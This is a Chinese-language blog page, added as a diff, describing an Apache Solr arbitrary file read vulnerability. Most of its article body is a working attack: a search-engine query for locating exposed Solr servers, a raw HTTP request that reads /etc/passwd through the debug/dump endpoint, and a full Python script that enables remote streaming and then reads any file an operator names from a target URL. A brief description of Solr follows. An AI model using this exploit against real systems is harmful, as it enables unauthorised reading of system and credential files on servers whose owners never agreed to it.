@@ -1,0 +1,650 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="fofa 语法如下：   app&#x3D;”Apache-Solr”  我们随便点一个进去    POC 如下：   123456789101112131415POST &#x2F;solr&#x2F;ckan&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1Host: xxx.xxx.xxx.xxx:8983Content-Length: 29Cache-Control: max-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Solr 任意文件读取漏洞">
+<meta property="og:url" content="http://example.com/2023/04/20/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="fofa 语法如下：   app&#x3D;”Apache-Solr”  我们随便点一个进去    POC 如下：   123456789101112131415POST &#x2F;solr&#x2F;ckan&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1Host: xxx.xxx.xxx.xxx:8983Content-Length: 29Cache-Control: max-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/796bff4063b498ef658cda70db14794a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/67bd67b3ba39780f46c57732b4063e95.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f36b0ad4bf254aa50a82dc362d2f576b.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.605Z">
+<meta property="article:modified_time" content="2023-04-20T15:17:54.973Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/796bff4063b498ef658cda70db14794a.png">
+  
+  
+  
+  <title>Apache Solr 任意文件读取漏洞 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Apache Solr 任意文件读取漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Apache Solr 任意文件读取漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>fofa 语法如下：  </p>
+<p>app&#x3D;”Apache-Solr”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/796bff4063b498ef658cda70db14794a.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们随便点一个进去  </p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/67bd67b3ba39780f46c57732b4063e95.png" srcset="/img/loading.gif" lazyload></p>
+<p>POC 如下：  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /solr/ckan/debug/dump?param=ContentStreams HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: xxx.xxx.xxx.xxx:<span class="hljs-number">8983</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">29</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">89</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4389</span>.<span class="hljs-number">82</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">118.31.46.134:8983</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">118.31.46.134:8983</span>/solr/ckan/config<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">stream</span>.url=file:///etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>当然我们也可以使用 PeiQi 师傅已经写好的 python 脚本  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import sys<br>import random<br>import re<br>import base64<br>import time<br><span class="hljs-keyword">from</span> lxml import etree<br>import json<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions import InsecureRequestWarning<br><br>def title():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34m公众号  : PeiQi文库                        \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br><br>def POC_1(target_url):<br>    core_url = target_url + <span class="hljs-string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span><br>    try:<br>        response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-attribute">url</span>=core_url, <span class="hljs-attribute">timeout</span>=10)<br>        core_name = list(json.loads(response.text)[<span class="hljs-string">&quot;status&quot;</span>])[0]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 成功获得core_name,Url为：&quot;</span> + target_url + <span class="hljs-string">&quot;/solr/&quot;</span> + core_name + <span class="hljs-string">&quot;/config\033[0m&quot;</span>)<br>        return core_name<br>    except:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;</span>)<br>        sys.exit(0)<br><br>def POC_2(target_url, core_name):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/solr/&quot;</span> + core_name + <span class="hljs-string">&quot;/config&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span><br>    try:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(<span class="hljs-attribute">url</span>=vuln_url, <span class="hljs-attribute">data</span>=data, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">verify</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=5)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;</span>.format(target_url))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;This&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == 200:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;</span>.format(target_url))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;</span>.format(target_url))<br>            sys.exit(0)<br><br>    except Exception as e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br>def POC_3(target_url, core_name, File_name):<br>    vuln_url = target_url + <span class="hljs-string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.format(core_name)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.format(File_name)<br>    try:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(<span class="hljs-attribute">url</span>=vuln_url, <span class="hljs-attribute">data</span>=data, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">verify</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=5)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;No such file or directory&quot;</span> <span class="hljs-keyword">in</span> response.text:    <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;</span>.format(File_name))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.format(json.loads(response.text)[<span class="hljs-string">&quot;streams&quot;</span>][0][<span class="hljs-string">&quot;stream&quot;</span>]))<br><br><br>    except Exception as e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    title()<br>    target_url = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))<br>    core_name = POC_1(target_url)<br>    POC_2(target_url, core_name)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        File_name = str(input(<span class="hljs-string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))<br>        POC_3(target_url, core_name, File_name)<br></code></pre></td></tr></table></figure>
+
+<p>我们把脚本复制到一个 test.py 里，然后开始运行  </p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f36b0ad4bf254aa50a82dc362d2f576b.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现成功读取到 &#x2F; etc&#x2F;passwd  </p>
+<p>Solr</p>
+<p>Solr 是一个独立的企业级搜索应用服务器，它对外提供类似于 Web-service 的 API 接口。用户可以通过 http 请求，向搜索引擎服务器提交一定格式的 XML 文件，生成索引；也可以通过 Http Get 操作提出查找请求，并得到 XML 格式的返回结果。</p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>Solr 是一个高性能，采用 Java 开发，基于 Lucene 的全文搜索服务器。同时对其进行了扩展，提供了比 Lucene 更为丰富的查询语言，同时实现了可配置、可扩展并对查询性能进行了优化，并且提供了一个完善的功能管理界面，是一款非常优秀的全文搜索引擎。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Apache Solr 任意文件读取漏洞</div>
+      <div>http://example.com/2023/04/20/Apache Solr 任意文件读取漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/BUUCTF%EF%BC%88%E4%BA%8C%EF%BC%89/" title="BUUCTF（二）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF（二）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/2023-NKCTF/" title="2023-NKCTF">
+                        <span class="hidden-mobile">2023-NKCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
